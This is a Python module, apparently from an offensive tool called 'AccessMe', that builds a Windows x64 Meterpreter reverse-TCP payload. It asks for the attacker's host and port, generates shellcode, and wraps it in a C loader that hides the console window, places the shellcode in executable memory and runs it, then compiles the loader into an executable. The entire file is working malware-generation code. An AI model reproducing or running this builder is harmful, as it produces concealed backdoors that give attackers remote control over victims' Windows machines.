#Import
from lib import core
from payload import gen

def Construction():

    ARCH = "x64"
    PROTOCOLE = "TCP"
    TYPE = "Meterpreter"
    PLATFORM = "Windows"

    print("Payload x64 Meterpreter Reverse TCP")
    core.x64_Windows_Features()

    Features_while = True

    while Features_while:

        Choice = core.core_input_pass()

        if Choice == "":
            core.Clear()
            Features_while = False

        else:
            core.Clear()
            Features_while = False

    Gen_Payload = True

    while Gen_Payload:
        LHOST = gen.LHOST_Input()
        LPORT = gen.LPORT_Input()
        FILENAME = "/root/AccessMe/Output/" + gen.FILENAME_Input() + ".exe"

        PAYLOAD = gen.Gen_Shellcode(ARCH, PROTOCOLE, TYPE, LHOST, LPORT)

        print("Génération du fichier...")

        Final_Code = "#include <windows.h>\n"
        Final_Code += "#include <stdio.h>\n"
        Final_Code += "#include <stdlib.h>\n"
        Final_Code += "int main(int argc, char **argv) {\n"
        Final_Code += "char shellcode[] = {\n"
        Final_Code += str(PAYLOAD)
        Final_Code += "};HWND hWnd = GetConsoleWindow();ShowWindow(hWnd, SW_HIDE);void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);memcpy(exec, shellcode, sizeof shellcode);((void(*)())exec)();}"

        with open('source.c', 'w') as f:
            f.write(Final_Code)

        print("\nFichier généré\n")

        print("\nCompiling\n")

        gen.Auto_Compiler(FILENAME, ARCH, PLATFORM)

        Gen_Payload = False